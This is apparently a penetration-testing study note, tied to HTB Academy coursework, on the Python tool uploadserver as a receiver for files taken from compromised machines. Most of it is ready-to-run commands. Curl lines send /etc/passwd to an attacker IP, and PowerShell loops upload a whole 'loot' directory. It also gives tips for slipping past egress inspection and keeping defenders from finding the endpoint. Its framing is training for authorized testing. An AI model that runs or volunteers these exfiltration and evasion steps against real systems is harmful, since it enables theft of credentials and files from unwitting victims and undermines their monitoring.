# uploadserver

**Tags:** #uploadserver #FileTransfer #Exfiltration #Python #PostExploitation #HTTP

`uploadserver` extends Python's built-in `http.server` with an upload endpoint, so a single command gives you a listener that receives files *from* a compromised host over plain HTTP(S). It fills the gap `python3 -m http.server` leaves — that module only serves files outward, with no way to accept them.

**Source:** https://github.com/Densaugeo/uploadserver
**Install:** `pip3 install uploadserver`

```bash
# Plain HTTP receiver — files land in the current directory
python3 -m uploadserver 8001

# HTTPS (avoids plaintext loot on the wire, and gets past egress inspection that flags HTTP)
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
python3 -m uploadserver --ssl server.pem 8001

# Require a token so a blue-teamer who finds the endpoint can't enumerate it
python3 -m uploadserver 8001 --token <SECRET>
```

```bash
# Sending from a Linux target
curl -X POST http://10.10.14.5:8001/upload -F 'files=@/etc/passwd'
curl -X POST https://10.10.14.5:8001/upload -F 'files=@/etc/passwd' --insecure
```

```powershell
# Sending from a Windows target
Invoke-RestMethod -Uri "http://10.10.14.5:8001/upload" -Method Post -ContentType "multipart/form-data" -InFile "C:\loot\file.txt"

# Whole directory
Get-ChildItem -Path "C:\loot\" -File | ForEach-Object {
    Invoke-RestMethod -Uri "http://10.10.14.5:8001/upload" -Method Post -ContentType "multipart/form-data" -InFile $_.FullName
}
```

> [!note] The upload path is `/upload` — POSTing to `/` returns the directory listing instead and your file goes nowhere. Field name must be `files`.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] — receiving exfil from a target; download-direction counterpart is `python3 -m http.server`, or [[Tools/File Transfer/updog|updog]] for both directions with a UI.

---

*Created: 2026-07-30*
*Updated: 2026-07-30*
*Model: claude-opus-5*
